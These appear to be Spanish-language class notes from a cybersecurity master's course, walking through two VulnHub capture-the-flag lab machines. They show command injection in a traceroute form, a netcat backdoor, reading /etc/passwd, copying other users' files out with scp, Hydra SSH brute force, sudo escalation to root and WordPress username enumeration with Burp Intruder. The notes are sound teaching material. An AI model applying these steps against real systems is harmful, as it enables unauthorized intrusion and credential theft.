---
tags:
- Máquinas y prácticas
date: '2026-06-09'
---

# Son ROBOTS

<p class="note-meta">2026-06-09</p>

**MÁSTER EN CIBERSEGURIDAD · EVOLVE ACADEMY**

**«Son ROBOTS»**

**Post-explotación, movimiento lateral y escalada de privilegios**

*Máquinas: RickdiculouslyEasy (completa) · Mr. Robot (inicio)*

Clase del 09/06/2026 · Imparte: Carlos Castillo

| **ℹ Sobre estos apuntes**  Reconstruyen la metodología y los comandos tal y como se trabajaron en clase a partir de la transcripción de audio.  Los recuadros marcados como **Ampliación** añaden contexto que no se dijo literalmente pero que ayuda a entender el paso. Algunos valores concretos (contraseñas, nombres propios) provienen de una transcripción de audio y pueden contener pequeñas variaciones respecto a la pantalla; se señalan cuando es el caso. |
| --- |

# **Resumen de la sesión**

Sesión de tipo «repaso dinámico» centrada en la **auditoría interna**: una vez se ha conseguido un primer acceso a la máquina, ¿cómo nos movemos por dentro hasta ser administradores? Se trabajaron dos máquinas tipo CTF:

1. **RickdiculouslyEasy** (VulnHub) — se retomó desde el acceso ya obtenido el viernes y se completó: enumeración interna, robo de ficheros entre usuarios, descifrado de un binario, fuerza bruta de SSH y escalada final a root.
2. **Mr. Robot** (VulnHub) — se empezó el reconocimiento y la enumeración web; queda pendiente terminar la fuerza bruta del panel de WordPress (continúa el jueves).

**Fases del pentest vistas hoy**

| **Superficie expuesta** | **→** | **Enumeración** | **→** | **Explotación** | **→** | **Mov. lateral** | **→** | **Escalada privilegios** | **→** | **Persistencia** | **→** | **Reporte** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| **ℹ Idea central de la clase**  Lo que comprometemos primero suele ser una cuenta de servicio (p. ej. www-data), que casi no puede hacer nada. Desde ahí saltamos a cuentas de usuario (que sí tienen /home y permisos), de usuario a usuario las veces que haga falta, y finalmente a root. Ese salto final es la escalada de privilegios. |
| --- |

# **Conceptos base: tipos de cuenta y permisos**

## **Tipos de cuenta en un sistema**

| **Tipo de cuenta** | **Características** | **Ejemplos** |
| --- | --- | --- |
| Cuenta de servicio | Creada para que corra un servicio en un puerto. Permisos muy reducidos sobre el sistema, amplios sobre su servicio. Sin /home real, con nologin. | www-data, apache, ftp |
| Cuenta de usuario | Persona real del sistema. Tiene /home propio, shell (/bin/bash) y permisos de lectura/escritura en su espacio. | summer, Morty, RickSanchez |
| Cuenta administrador | Máxima autoridad. No usa /home, sino /root. | root |

| **ℹ Cómo leer /etc/passwd**  Cada línea es un usuario. Lo importante son las dos últimas columnas: el **directorio** (si es /home/x o /root es un usuario legítimo) y la **shell**. Si termina en /bin/bash puede usar terminal; si pone /usr/sbin/nologin es una cuenta de servicio sin acceso interactivo. |
| --- |
| **Enumerar usuarios del sistema** |
| summer@target:~$ cat /etc/passwd  root:x:0:0:root:/root:/bin/bash  ...  ftp:x:111:115:ftp daemon:/srv/ftp:/usr/sbin/nologin # cuenta de servicio  Morty:x:1001:1001::/home/Morty:/bin/bash # usuario real  RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash # usuario real |
| **✓ Matiz importante (FTP anónimo ≠ acceso al sistema)**  Que el FTP permita login anónimo no significa que el usuario ftp pueda entrar al sistema: esa cuenta solo accede a su propio servicio (su carpeta /srv/ftp), nunca a una shell. |

## **Permisos de fichero (owner / group / others)**

Los permisos se leen en tres bloques — **propietario, grupo y otros** — cada uno con r (lectura), w (escritura) y x (ejecución). Para copiar un fichero solo se necesitan dos cosas:

- **Origen legible** → permiso r sobre el fichero que quiero copiar.
- **Destino escribible** → permiso w sobre la carpeta donde lo dejo.

| **ℹ El símil de la clase**  Aunque un libro (fichero) sea de otra persona y no puedas escribir en él, si lo puedes leer, puedes transcribirlo a tu libreta (una carpeta donde sí tienes escritura) y entonces hacer con esa copia lo que quieras. |
| --- |
| **⚠ La carpeta /tmp y el sticky bit**  La carpeta /tmp tiene permisos de lectura, escritura y ejecución para todos (de ahí el color distinto en ls, por la «t» de sticky bit). Por eso se usa tanto para subir y ejecutar herramientas cuando la cuenta comprometida no tiene un /home donde escribir. Como administrador de sistemas, es una carpeta a vigilar. |

# **Parte 1 · RickdiculouslyEasy (VulnHub)**

| **ℹ Datos de la máquina**  IP víctima: 10.0.2.15 · Usuarios: Morty, summer, RickSanchez · Objetivo: sumar flags hasta llegar a root. |
| --- |

## **1. Repaso de la fase externa (clase del viernes)**

La auditoría externa ya estaba hecha. Resumen de lo conseguido desde fuera:

| **Puerto** | **Servicio** | **Hallazgo** |
| --- | --- | --- |
| 21 | FTP (anonymous) | Login anónimo permitido. Con get se descarga flag.txt (en FTP no hay cat; con help se ven sus comandos). Un directorio sin nada útil. |
| 22 | «SSH» falso | Nmap solo veía un tcpwrapped. Al intentar conectar no daba conexión → puerto muerto. |
| 80 | Web | robots.txt → /cgi-bin/.... Un script tipo tracer ejecutaba comandos en el backend (RCE por concatenación). |
| 9090 | Cockpit (Fedora) | Panel sin exploit público → rabbit hole. Solo daba una flag. |
| 13337 / 22222 / 60000 | Ocultos (nmap -p-) | 60000 = backdoor con shell vía nc; 22222 = el SSH real; varias flags. |

| **Fase externa — comandos clave** |
| --- |
| # 1) Descubrir activos en mi rango de red (lo obtengo con ifconfig)  sudo netdiscover -r 10.0.2.0/24    # 2) Escaneo silencioso inicial (sin parámetros) y luego scripts+versiones  nmap 10.0.2.15  nmap -sCV 10.0.2.15    # 3) Escaneo de TODOS los puertos: aparecen los ocultos  nmap -p- 10.0.2.15    # Enumeración de directorios de la web  dirsearch -u http://10.0.2.15    # Backdoor sin autenticación en el puerto 60000  nc 10.0.2.15 60000 |
| **✓ RCE por concatenación de comandos**  El formulario que pedía una IP ejecutaba traceroute en el servidor. Al concatenar con ; o && (p. ej. 8.8.8.8; whoami) el backend respondía como www-data, confirmando ejecución remota de comandos. |
| **ℹ La contraseña «winter»**  Con dirsearch apareció un directorio /passwords/. La página parecía vacía, pero en **ver código fuente** había un comentario con la contraseña winter, que resultó ser la del usuario summer. |

## **2. Acceso inicial por SSH**

El SSH real no está en el 22, sino en el 22222. Con las credenciales summer:winter entramos:

| **Acceso interactivo** |
| --- |
| ssh summer@10.0.2.15 -p 22222  # (contraseña: winter) |
| **⚠ ¿Por qué Nmap «mentía» en el puerto 22?**  Sin parámetros, Nmap muestra el servicio **esperado por defecto** en cada puerto. Con -sCV hace descubrimiento activo y muestra lo que **realmente** hay: el 22 era un servicio falso (tcpwrapped) y el SSH auténtico estaba en el 22222 (OpenSSH). |

## **3. Enumeración interna («ser cotilla»)**

Ya dentro, antes de atacar conviene reconocer el terreno. Comandos que se lanzan casi siempre tras un compromiso de Linux:

| **Checklist de enumeración interna** |
| --- |
| # Leer la flag que tenemos delante (cat no iba; se usó head)  head -n 20 flag.txt    # Usuarios del sistema  cat /etc/passwd    # ¿Qué puedo ejecutar como root sin contraseña? (vector de escalada nº1)  sudo -l    # Versión de kernel/SO (para buscar exploits si hiciera falta)  uname -a    # Buscar binarios con bit SUID (permiso 4000)  find / -perm -4000 2>/dev/null |
| **ℹ sudo -l vs SUID**  sudo -l lista los comandos que mi usuario puede ejecutar como root (reglas de grupo predefinidas). El **bit SUID** son ficheros concretos marcados para ejecutarse con los permisos de su propietario. En esta máquina sudo -l salió vacío para summer — algo totalmente normal en un primer compromiso. |

## **4. Robo de ficheros entre usuarios**

Desde summer se exploran los /home de los otros usuarios. Tenemos lectura sobre sus carpetas:

**Carpeta de RickSanchez → binario «safe»**

| **El binario protegido** |
| --- |
| cd /home/RickSanchez/RICKS\_SAFE  ls -la  file safe # -> ejecutable (ELF)  ./safe # pide argumentos: "use good command line arguments" |
| **⚠ Permisos: por qué falló ./safe al principio**  Sobre safe como summer solo teníamos r (lectura), no x. La solución es **copiarlo** a una carpeta nuestra (origen legible + destino escribible) y trabajarlo allí. |

**Carpeta de Morty → imagen + zip**

En /home/Morty hay un Safe\_Password.jpg y un journal.txt.zip protegido. Nos los llevamos a nuestra Kali.

## **5. Transferencia de ficheros: cp y scp**

Dentro de la víctima copiamos con cp. Para traer ficheros a nuestra Kali se usa scp (que es «cp a través del protocolo SSH»). Misma sintaxis que ssh, recordando especificar el puerto con -P:

| **cp interno y scp hacia la máquina atacante** |
| --- |
| # Copia interna (mover a una carpeta donde tengo escritura)  cp /home/RickSanchez/RICKS\_SAFE/safe /tmp/  cp /home/RickSanchez/RICKS\_SAFE/safe ../summer/    # Traer ficheros de la víctima a mi Kali (ojo al puerto 22222)  scp -P 22222 summer@10.0.2.15:/home/Morty/Safe\_Password.jpg .  scp -P 22222 summer@10.0.2.15:/home/Morty/journal.txt.zip .  # (contraseña: winter) |
| **ℹ scp es bidireccional**  Igual que descargamos, podríamos **subir** a la víctima invirtiendo origen y destino: scp -P 22222 fichero.sh summer@10.0.2.15:/tmp/. |

## **6. Análisis de los ficheros robados**

La imagen no se abre en la víctima (es solo terminal) y exiftool no está instalado allí — es propio de Kali, no de un Linux normal. Por eso trabajamos en la Kali:

| **Metadatos y strings de la imagen** |
| --- |
| exiftool Safe\_Password.jpg # metadatos: poca cosa relevante  strings Safe\_Password.jpg # cadenas embebidas -> aparece una contraseña |
| **ℹ strings: leer el «bajo nivel» de un fichero**  strings extrae las cadenas de texto legibles dentro de cualquier fichero (ejecutable, imagen…). En la imagen reveló una contraseña incrustada — técnica relacionada con la **esteganografía** (información escondida en píxeles que «pierden» su color, p. ej. un píxel negro). |
| **⚠ Valor de la contraseña (transcripción de audio)**  La contraseña incrustada en la imagen se citó de oído como «music / MISIC»; al ser audio, conviene confirmarla con la cadena exacta que devuelve strings en pantalla. Es la que abre el journal.txt.zip y el argumento del binario safe. |

Con esa contraseña se descomprime el zip y se ejecuta el binario:

| **Descifrado del zip y del binario** |
| --- |
| unzip journal.txt.zip # pide la contraseña hallada  cat journal.txt # pista narrativa + una flag    # El binario safe, con sus argumentos correctos, suelta otra flag  ./safe <argumento\_de\_la\_imagen> |
| **✓ Pista clave: la política de contraseña de Rick**  Al resolver el binario aparece un **Rick's Password Hints**: su contraseña se compone de **una mayúscula + un dígito + una palabra del nombre de su antigua banda**. |

## **7. Generar diccionario + fuerza bruta SSH (Hydra)**

| **ℹ Ampliación · El nombre de la banda**  La banda de Rick Sánchez es **The Flesh Curtains** (en la transcripción se oyó como «de fresh cool times»). La palabra que entra en la contraseña es Curtains, coherente con la clave final encontrada. |
| --- |

Aplicando la regla (mayúscula + dígito + palabra de la banda) se generó un diccionario de ~780 combinaciones y se lanzó hydra contra el SSH:

| **Fuerza bruta del SSH con Hydra** |
| --- |
| # Estructura de hydra para SSH (ojo al puerto):  # -l usuario -L lista\_usuarios  # -p contraseña -P lista\_contraseñas  hydra -l RickSanchez -P diccionario.txt ssh://10.0.2.15:22222 |
| **✓ Credencial encontrada**  Hydra devolvió la contraseña de RickSanchez: P7Curtains (transcrita de oído como «p7curtains»). Encaja con la política: mayúscula + dígito + palabra de la banda. |

## **8. Escalada final a root**

| **De RickSanchez a root** |
| --- |
| ssh RickSanchez@10.0.2.15 -p 22222 # contraseña: P7Curtains  whoami # RickSanchez    sudo -l # -> (ALL : ALL) ALL    # Como puedo ejecutar cualquier comando como root, cambio de usuario:  sudo su  whoami # root  cat /root/\*flag\* |
| **✓ Por qué funciona sudo su sin la contraseña de root**  sudo su cambia a root, lo que normalmente pediría la contraseña de root. Pero como sudo -l indica (ALL : ALL) ALL, RickSanchez puede ejecutar cualquier comando como root **sin que se la pida**. Equivale a «ejecutar como administrador» en Windows cuando ya tienes el permiso concedido. |

**Cadena completa de la máquina**

| **www-data (RCE web)** | **→** | **summer (SSH:22222)** | **→** | **Robo de ficheros** | **→** | **Hydra → RickSanchez** | **→** | **sudo su → root** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

# **Parte 2 · Mr. Robot (VulnHub) — inicio**

| **⚠ Máquina sin terminar**  Solo se hizo el reconocimiento y el comienzo de la enumeración web. La fuerza bruta del panel de WordPress se dejó corriendo y se continúa el jueves. |
| --- |
| **ℹ Datos de la máquina**  IP víctima: 10.0.2.7 · El nombre y el «lore» de la serie Mr. Robot son pistas para adivinar usuarios. |

## **1. Reconocimiento**

| **Descubrimiento** |
| --- |
| sudo netdiscover -r 10.0.2.0/24 # localizar la IP de la víctima  nmap -p- -sCV 10.0.2.7 # todos los puertos + versiones |
| **Puerto** | **Estado** | **Notas** |
| 22 | Cerrado | SSH no disponible. |
| 80 | Abierto | Servidor web HTTP. |
| 443 | Abierto | El 80 con capa SSL/TLS (HTTPS). El 80 suele redirigir al 443. |

| **ℹ Ampliación · 80 vs 443**  El puerto 443 es esencialmente el puerto 80 con una capa de cifrado (un certificado SSL/TLS que protege las comunicaciones). Por eso es habitual que el contenido sea el mismo y que 80 redirija a 443. |
| --- |

## **2. Enumeración web y robots.txt**

La web muestra una animación tipo terminal de la serie. Se enumera con dirsearch / feroxbuster y se interpretan los códigos de respuesta:

| **Código** | **Significado** |
| --- | --- |
| 200 | OK |
| 301 / 302 | Redirección |
| 403 | Prohibido |
| 404 | No encontrado |

| **ℹ Truco mnemotécnico de clase**  Para recordar los códigos HTTP con gatitos: https://http.cat. |
| --- |

La enumeración revela /wp-login, /license, un /dashboard y, sobre todo, el robots.txt — el guiño del título de la clase:

| **robots.txt** |
| --- |
| # http://10.0.2.7/robots.txt  User-agent: \*  key-1-of-3.txt # <- primera flag  fsocity.dic # <- diccionario (~858.000 líneas) |
| **ℹ Qué dice realmente robots.txt**  Indica a los crawlers (Google, Yandex…) qué pueden indexar. User-agent: \* = aplica a todos los navegadores. Para un atacante es oro: suele listar rutas y ficheros que el dueño no quería visibles. Aquí destapa una flag y un diccionario. |

## **3. Sanitizar el diccionario**

El fsocity.dic tiene ~858.000 líneas, muchas repetidas. Antes de una fuerza bruta hay que limpiarlo (quitar duplicados):

| **Limpieza con sort | uniq** |
| --- |
| wc -l fsocity.dic # ~858.000 lineas  sort fsocity.dic | uniq > fsocity\_clean.dic  wc -l fsocity\_clean.dic # ~11.452 lineas unicas |
| **✓ Por qué importa**  Pasar de 858.000 a 11.452 líneas (~80 veces menos) reduce drásticamente el tiempo de la fuerza bruta. Sanitizar siempre los diccionarios que saquemos de una máquina es una buena práctica. |

## **4. WordPress + information disclosure**

En /wp-login.php se observa una **fuga de información** por los mensajes de error: si el usuario no existe responde Invalid username; si existe pero la contraseña falla, responde incorrect password. Eso permite **enumerar usuarios**.

| **ℹ Information disclosure en logins**  Un login bien diseñado debería dar un mensaje genérico («usuario o contraseña incorrectos»). Cuando distingue entre «usuario inválido» y «contraseña incorrecta», revela qué usuarios existen — exactamente lo que explotamos aquí. |
| --- |

## **5. Burp Suite: interceptar y atacar**

Se usa **Burp Suite** como proxy (con la extensión FoxyProxy en el navegador) para interceptar las peticiones entre nuestra máquina y el servidor:

- Proxy → Intercept ON: la petición queda «retenida» hasta que la liberamos con Forward.
- Repeater (clic derecho → Send to Repeater): reenvía una misma petición modificándola para ver la respuesta.
- Intruder (modo Sniper): automatiza el envío masivo cambiando un parámetro con un diccionario (el payload).

| **ℹ Anatomía de la petición de login**  Es un POST a /wp-login.php porque enviamos datos a la base de datos (un GET sería para pedir información). Campos relevantes: log (usuario) y pwd (contraseña). En la respuesta lo clave es la **longitud**: el error «invalid username» medía ~4065 bytes. |
| --- |

## **6. Enumerar el usuario por longitud de respuesta**

En Intruder se marca el campo de usuario como payload y se prueban candidatos. Todos los genéricos (admin, user, etc.) devuelven la misma longitud (~4065 = «invalid username»). Pero el protagonista de la serie sí existe:

| **Usuario probado** | **Longitud respuesta** | **Interpretación** |
| --- | --- | --- |
| admin / user / user1… | ~4065 bytes | «Invalid username» → no existe |
| Elliot | **~4116 bytes** | Distinta → «the password is incorrect» = **usuario válido** |

| **✓ Resultado**  El usuario Elliot existe (longitud de respuesta distinta y mensaje de error diferente). El siguiente paso es repetir el ataque con Intruder sobre el campo pwd, usando el diccionario limpio, y buscar de nuevo la longitud de respuesta que «se salga» del resto. |
| --- |

## **Cadena de la máquina (hasta ahora)**

| **nmap (80/443)** | **→** | **robots.txt → fsocity.dic** | **→** | **Limpiar diccionario** | **→** | **Enumerar usuario: Elliot** | **→** | **Fuerza bruta pwd (pendiente)** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| **ℹ Sobre versiones de WordPress (pregunta de clase)**  La fuga de información usuario/contraseña no es un fallo de versión: es una opción de configuración del propietario en el panel de WordPress. Las versiones modernas vienen configuradas por defecto para no revelarlo; antiguamente sí se podía dejar activado. |

# **Herramientas y comandos de referencia**

| **Herramienta** | **Para qué** | **Uso visto en clase** |
| --- | --- | --- |
| netdiscover | Descubrir activos en la red local | sudo netdiscover -r 10.0.2.0/24 |
| nmap | Escaneo de puertos / versiones | nmap -sCV <ip> · nmap -p- <ip> |
| dirsearch / feroxbuster | Enumeración de directorios web | dirsearch -u http://<ip> |
| nc (netcat) | Conexiones TCP crudas / shells | nc 10.0.2.15 60000 |
| ssh | Acceso remoto | ssh user@<ip> -p 22222 |
| scp | Copiar ficheros vía SSH | scp -P 22222 user@<ip>:/ruta . |
| find (SUID) | Buscar binarios privilegiados | find / -perm -4000 2>/dev/null |
| strings / exiftool | Inspeccionar ficheros e imágenes | strings img.jpg · exiftool img.jpg |
| hydra | Fuerza bruta de credenciales | hydra -l user -P dic.txt ssh://<ip>:22222 |
| sort | uniq | Sanitizar diccionarios | sort dic | uniq > dic\_clean |
| Burp Suite + FoxyProxy | Auditoría web (proxy/repeater/intruder) | Enumeración por longitud de respuesta |

# **Pendiente para la próxima clase**

- **Mr. Robot**: terminar la fuerza bruta de la contraseña de Elliot con Intruder + diccionario limpio, y continuar hacia las 3 flags (continúa el jueves con Dani / Carlos).
- Se mostrará lo de **Hack The Box** que quedó pendiente; ya se puede empezar a hacer máquinas por cuenta propia.
- Las próximas máquinas profundizarán en escaladas de privilegios y movimiento lateral con varios saltos entre usuarios.

| **✓ Mentalidad del CTF**  Como recordó Carlos: el flujo siempre es el mismo — superficie de exposición → enumero → exploto → consigo shell → vuelvo a enumerar dentro → escalo privilegios. El objetivo de estos repasos es que ese ciclo «suene» antes de verlo paso a paso en detalle. |
| --- |
